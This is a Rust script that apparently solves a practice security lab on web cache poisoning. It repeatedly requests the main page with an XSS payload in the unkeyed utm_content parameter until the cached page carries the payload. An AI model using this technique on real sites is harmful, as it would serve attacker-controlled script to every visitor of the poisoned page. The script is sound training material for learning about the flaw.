/*************************************************************
*
* Lab: Web cache poisoning via an unkeyed query parameter
*
* Hack Steps:
*      1. Inject payload as a query parameter
*      2. Send multiple request to the main page to cache it
*         with the injected payload
*
**************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a0e000104ce670b85a7a351009800a0.web-security-academy.net";

fn main() {
    let payload = r###"'><img src%3d1 onerror%3dalert(1)>"###;

    // 10 times to make sure that the request is cached
    for i in 1..=10 {
        print!("\r❯❯ Poisoning the main page with the payload as a query parameter ({i}/10).. ");
        flush_terminal();

        poison_main_page(payload);
    }

    println!("{}", "OK".green());
    println!("🗹 The main page is poisoned successfully");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn poison_main_page(payload: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}/?utm_content={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the main page with the injected payload".red()
        ))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
